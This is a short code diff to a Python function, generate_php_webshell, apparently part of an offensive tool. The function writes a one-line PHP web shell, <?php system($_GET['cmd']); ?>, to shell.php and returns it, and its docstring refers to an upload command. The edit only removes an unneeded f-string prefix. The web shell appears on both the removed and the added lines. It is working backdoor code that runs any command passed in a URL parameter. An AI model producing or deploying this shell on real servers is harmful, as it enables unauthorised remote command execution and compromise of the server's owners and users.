@@ -16,8 +16,8 @@ def generate_php_webshell(target_url=None, port=None, protocol="http"):
         Tuple of (webshell content, upload command)
     """
     with open('shell.php', 'w', encoding='utf-8') as f:
-        f.write(f"""<?php system($_GET['cmd']); ?>""")
-    webshell = f"""<?php system($_GET['cmd']); ?>"""
+        f.write("""<?php system($_GET['cmd']); ?>""")
+    webshell = """<?php system($_GET['cmd']); ?>"""
 
     if not target_url:
         return webshell
